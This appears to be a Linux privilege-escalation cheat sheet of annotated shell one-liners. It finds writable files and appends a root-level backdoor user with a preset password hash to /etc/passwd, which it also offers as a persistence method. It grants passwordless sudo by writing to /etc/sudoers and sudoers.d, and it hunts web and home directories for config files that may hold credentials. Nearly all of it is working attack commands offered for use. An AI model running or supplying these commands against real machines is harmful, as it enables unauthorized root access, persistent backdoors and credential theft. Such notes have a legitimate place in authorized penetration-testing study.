find / -writable -type f 2>/dev/null #<---Display writeable files.
echo "root2:\$1\$OpQjzySv\$5a8SzrQPOMtIRfqfgQtxY.:0:0:root:/root:/bin/bash" >> /etc/passwd #<--- If /etc/passwd is writeable, make the user root2:toor. This also can be considered a way to achieve persistance in a machine.

openssl passwd -1 #<--- Create a password hash for /etc/passwd file.

echo "<USERNAME>  ALL=(ALL) NOPASSWD:ALL" | tee -a /etc/sudoers #<--- If /etc/sudoers is writeable.
echo "<USERNAME>  ALL=(ALL) NOPASSWD:ALL" | tee -a /etc/sudoers.d/<USERNAME> #<--- If /etc/sudoers.d directory is writeable.
find <PATH> -name <Filename> 2>/dev/null #<--- Sensible files could contains credentials.
#Example; find /var/www/html -name *config* 2>/dev/null
#	  find /home/user -name *setting* 2>/dev/null
#	  find /etc -name *cfg* 2>/dev/null
#	  find /var/www/html *database* 2>/dev/null
#	  find /var/www/html *db* 2>/dev/null

